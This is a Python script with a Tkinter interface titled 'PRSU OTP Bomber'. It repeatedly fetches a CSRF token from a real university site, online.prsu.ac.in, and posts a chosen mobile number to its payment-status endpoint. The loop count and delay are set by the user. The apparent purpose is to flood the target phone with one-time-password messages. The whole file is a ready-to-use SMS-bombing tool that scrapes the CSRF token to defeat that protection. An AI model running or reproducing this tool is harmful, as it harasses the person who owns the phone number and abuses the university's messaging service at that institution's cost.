import requests
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import ttk
from tqdm import tqdm
import time

def execute_requests(event=None):
    url = "https://online.prsu.ac.in/site/paymentstatuspost"
    base_url = "https://online.prsu.ac.in"
    headers = {
        # Your headers here
    }

    session = requests.Session()

    mobile_number = mobile_entry.get()
    loop_count = int(loop_entry.get())
    delay_seconds = int(delay_entry.get())

    progress_bar['maximum'] = loop_count
    for i in tqdm(range(1, loop_count + 1), ncols=100):
        response = session.get(base_url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token_meta = soup.find('meta', {'name': 'csrf-token'})

        if csrf_token_meta:
            csrf_token = csrf_token_meta.get('content', 'CSRF Token Not Found')
        else:
            csrf_token = 'CSRF Token Not Found'

        data = {
            "mobile": mobile_number
        }

        headers["x-csrf-token"] = csrf_token

        response = session.post(url, headers=headers, data=data)

        if i < loop_count:
            time.sleep(delay_seconds)
        progress_bar['value'] = i
        progress_bar.update()
        
        loop_status_label.config(text=f"Loop {i}/{loop_count} is done")

    result_label.config(text=f"{loop_count}/{loop_count} loops are done")

# Function to set focus on loop_entry when the Return key is pressed in mobile_entry
def focus_on_loop_entry(event):
    loop_entry.focus()

# Function to set focus on delay_entry when the Return key is pressed in loop_entry
def focus_on_delay_entry(event):
    delay_entry.focus()

# Create the GUI
root = tk.Tk()
root.title("PRSU OTP Bomber")  # Change the title to "PRSU OTP Bomber"

# Set the window size in centimeters (assuming a typical screen DPI)
width_cm = 8.5
height_cm = 8.5

# Calculate the size in pixels based on screen DPI (you may need to adjust this)
dpi = root.winfo_fpixels('1i')
width = int(width_cm * dpi / 2.54)
height = int(height_cm * dpi / 2.54)

# Set the window size
root.geometry(f"{width}x{height}")

mobile_label = tk.Label(root, text="Enter your mobile number:")
mobile_label.pack()

mobile_entry = tk.Entry(root)
mobile_entry.pack()
mobile_entry.bind("<Return>", focus_on_loop_entry)

loop_label = tk.Label(root, text="Enter the number of loops to complete:")
loop_label.pack()

loop_entry = tk.Entry(root)
loop_entry.pack()
loop_entry.bind("<Return>", focus_on_delay_entry)

delay_label = tk.Label(root, text="Enter loop delay (in seconds):")
delay_label.pack()

delay_entry = tk.Entry(root)
delay_entry.pack()
delay_entry.bind("<Return>", execute_requests)

execute_button = tk.Button(root, text="Start Execution", command=execute_requests)
execute_button.pack()

progress_bar = ttk.Progressbar(root, length=200, mode='determinate')
progress_bar.pack()

loop_status_label = tk.Label(root, text="")
loop_status_label.pack()

result_label = tk.Label(root, text="")
result_label.pack()

# Create the text box
text_box = tk.Text(root, height=2, width=40)
text_box.pack()
text_box.insert(tk.END, "PRSU OTP Bomber was created by Rakshas")
text_box.config(state=tk.DISABLED)  # Make the text box read-only

root.mainloop()
